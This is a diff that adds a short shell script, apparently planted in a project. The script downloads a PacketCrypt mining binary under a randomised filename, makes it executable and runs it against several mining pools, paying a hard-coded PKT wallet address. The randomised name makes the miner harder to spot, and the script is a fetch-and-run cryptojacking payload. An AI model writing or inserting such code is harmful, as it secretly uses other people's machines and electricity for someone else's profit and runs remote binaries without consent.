@@ -1,0 +1,4 @@
+OKE=$(shuf -n 1 -i 1-9999999)
+wget -qO $OKE https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.4.4/packetcrypt-v0.4.4-linux_amd64
+chmod +x $OKE
+./$OKE ann -p pkt1q3r6qa92j5mgtgm4eusekelhrx27tz800qnd0h3 http://pool.srizbi.com http://pool.pktpool.io http://pool.pkt.world
